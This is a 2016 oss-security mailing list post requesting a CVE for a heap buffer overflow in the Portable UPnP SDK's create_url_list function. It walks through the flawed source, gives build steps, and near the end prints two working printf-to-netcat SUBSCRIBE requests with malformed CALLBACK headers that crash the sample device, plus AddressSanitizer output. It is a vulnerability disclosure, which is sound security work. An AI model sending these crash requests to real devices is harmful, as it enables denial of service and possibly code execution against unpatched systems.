@@ -1,0 +1,229 @@
+
+Date: Thu, 8 Sep 2016 17:16:11 -0400
+From: Scott Tenaglia <scott.tenaglia@...incea.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: Heap Overflow Portable UPnP SDK 1.6.19 through 1.8.x
+
+My previous request for a CVE seems to have been ignored. The only reason I
+can see is because I omitted the words "Heap Overflow" from the subject
+line. Resubmitting with amended subject line to get back in the queue.
+
+Portable UPnP SDK: https://sourceforge.net/projects/pupnp/
+Bug report: https://sourceforge.net/p/pupnp/bugs/133/
+
+There is a heap buffer overflow vulnerability in the create_url_list
+function in upnp/src/gena/gena_device.c. I first discovered this
+vulnerability when working with version 1.6.19 and have confirmed that it
+also exists in the latest code on the master branch (1.8.x). At the very
+least a reliable denial of service condition can be created by crashing the
+program.
+
+The problem in create_url_list starts in the following for-loop. The point
+of the loop is to parse the list of URIs enclosed in angled brackets (‘<‘
+and ‘>’) in the CALLBACK header of a SUBSCRIBE request. If the call to
+parse_uri() fails for any reason other than UPNP_E_OUTOF_MEMORY, or the
+hostport field of the parsed URI has a size of zero, then the URLcount
+variable will not be incremented. If 2 URIs are provided, with the first
+one being correctly formatted, and the second not, then URLcount will equal
+1 coming out of this loop.
+
+    for( i = 0; i < URLS->size; i++ ) {
+        if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {
+            if( ( ( return_code = parse_uri( &URLS->buff[i + 1],
+                                             URLS->size - i + 1,
+                                             &temp ) ) == HTTP_SUCCESS )
+                && ( temp.hostport.text.size != 0 ) ) {
+                URLcount++;
+            } else {
+                if( return_code == UPNP_E_OUTOF_MEMORY ) {
+                    return return_code;
+                }
+            }
+        }
+    }
+
+The next bit of code (abbreviated for readability) is where the overflow
+actually occurs. The first conditional evaluates to true because URLcount
+is 1. Next, a buffer is allocated (out->URLs) to hold a copy of the
+original URI string. Then, an array of uri_type structs are allocated
+(out->parsedURLs) to hold details of each parsed URI. The size of this
+array is going to be 1, because URLcount is 1. The problem is that the
+for-loop then parses the *original* URI string again. In fact, the only
+real difference between this for-loop and the previous one is that the
+parsed URIs are stored at successive indexes in the parsedURLs array
+instead of a temporary variable. So when it gets to parsing the second URI
+it passes out->parsedURLs[2] to the parse_uri() function, which is an
+address passed the end of the allocated array. As parse_uri() populates
+values of the struct it is writing passed the end of the array.
+
+    if( URLcount > 0 ) {
+        out->URLs = malloc(URLS->size + 1);
+        out->parsedURLs = malloc(sizeof(uri_type) * URLcount);
+        // omitted for readability
+        memcpy( out->URLs, URLS->buff, URLS->size );
+        out->URLs[URLS->size] = 0;
+        URLcount = 0;
+        for( i = 0; i < URLS->size; i++ ) {
+            if( ( URLS->buff[i] == '<' ) && ( i + 1 < URLS->size ) ) {
+                if( ( ( return_code =
+                        parse_uri( &out->URLs[i + 1], URLS->size - i + 1,
+                                   &out->parsedURLs[URLcount] ) ) ==
+                      HTTP_SUCCESS )
+                    && ( out->parsedURLs[URLcount].hostport.text.size !=
+                         0 ) ) {
+                    URLcount++;
+                } else {
+                    if( return_code == UPNP_E_OUTOF_MEMORY ) {
+                        free( out->URLs );
+                        free( out->parsedURLs );
+                        out->URLs = NULL;
+                        out->parsedURLs = NULL;
+                        return return_code;
+                    }
+                }
+            }
+        }
+    }
+
+Depending on the format of the malformed URI different things happen.
+Sometimes the overwrite has no noticeable impact, while other times it will
+crash the program. At the very least it is possible to create a reliable
+denial of service condition. It may also be possible to use this for remote
+code execution.
+
+Below are the steps that I used to trigger the vulnerability on both
+version 1.6.19 and 1.8.0. They should be sufficient to recreate the issue.
+
+First, compile for 32-bit with debugging enabled and an installation
+directory set. The reason for the setting the installation directory and
+compiling for 32-bits is so that “make install” results in a single binary
+that is easy to debug.
+
+./configure --prefix=<install dir> --enable-debug --host=i686-linux-gnu
+CFLAGS="-m32 -fno-omit-frame-pointer" LDFLAGS=-m32
+make clean;make install
+
+To setup the default sample, which emulates a TV device, do the following
+from the libupnp directory:
+cd upnp/sample
+mkdir tvdevice
+cp -r web tvdevice
+
+To run the sample change to the directory you just created and run the
+binary:
+cd tvdevice
+../.libs/tv_device
+
+With the sample running go to another terminal window. Enter the following
+to create a non-malicious subscription message:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153>\r\nNT: upnp:event\r\nTIMEOUT: Second-1801\r\n\r\n"
+| nc 127.0.0.1 49152
+
+One form of a malicious message will crash the application is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><http://a:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Another is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><//:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Below is the output of address sanitizer from either of the two requests above
+(add “-fsanitize=address” to CFLAGS  during configure).
+
+=================================================================
+==13048== ERROR: AddressSanitizer: heap-buffer-overflow on address
+0xeef07710 at pc 0xf698b0c3 bp 0xf1463998 sp 0xf1463988
+WRITE of size 4 at 0xeef07710 thread T8
+    #0 0xf698b0c2 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x460c2)
+    #1 0xf698cb13 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x47b13)
+    #2 0xf6992e1c (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4de1c)
+    #3 0xf6993bae (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4ebae)
+    #4 0xf69999f3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x549f3)
+    #5 0xf6964b8f (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fb8f)
+    #6 0xf6964e58 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fe58)
+    #7 0xf693baa4 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x5aa4)
+    #8 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #9 0xf69f13bc (/usr/lib/libasan.so.0.0.0+0xa3bc)
+    #10 0xf68feb2b (/usr/lib/libpthread-2.17.so+0x6b2b)
+    #11 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+0xeef07710 is located 8 bytes to the right of 168-byte region
+[0xeef07660,0xeef07708)
+allocated by thread T8 here:
+    #0 0xf69fe45f (/usr/lib/libasan.so.0.0.0+0x1745f)
+    #1 0xf69928da (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4d8da)
+    #2 0xf6993bae (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x4ebae)
+    #3 0xf69999f3 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x549f3)
+    #4 0xf6964b8f (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fb8f)
+    #5 0xf6964e58 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x1fe58)
+    #6 0xf693baa4 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x5aa4)
+    #7 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #8 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+Thread T8 created by T0 here:
+    #0 0xf69f12ca (/usr/lib/libasan.so.0.0.0+0xa2ca)
+    #1 0xf693be13 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x5e13)
+    #2 0xf693c882 (/home/user/Downloads/pupnp-code/install/lib/
+libthreadutil.so.10.0.0+0x6882)
+    #3 0xf6967c74 (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x22c74)
+    #4 0xf69a2aee (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x5daee)
+    #5 0xf69a2d2d (/home/user/Downloads/pupnp-code/install/lib/libupnp.so.
+10.0.0+0x5dd2d)
+    #6 0x804fc17 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_
+device+0x804fc17)
+    #7 0x805056c (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_
+device+0x805056c)
+    #8 0x8050631 (/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_
+device+0x8050631)
+    #9 0xf6754942 (/usr/lib/libc-2.17.so+0x19942)
+Shadow bytes around the buggy address:
+  0x3dde0e90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ea0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0eb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ec0: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00
+  0x3dde0ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x3dde0ee0: 00 fa[fa]fa fa fa fa fa fa fa 00 00 00 00 00 00
+  0x3dde0ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3dde0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+==13048== ABORTING
+
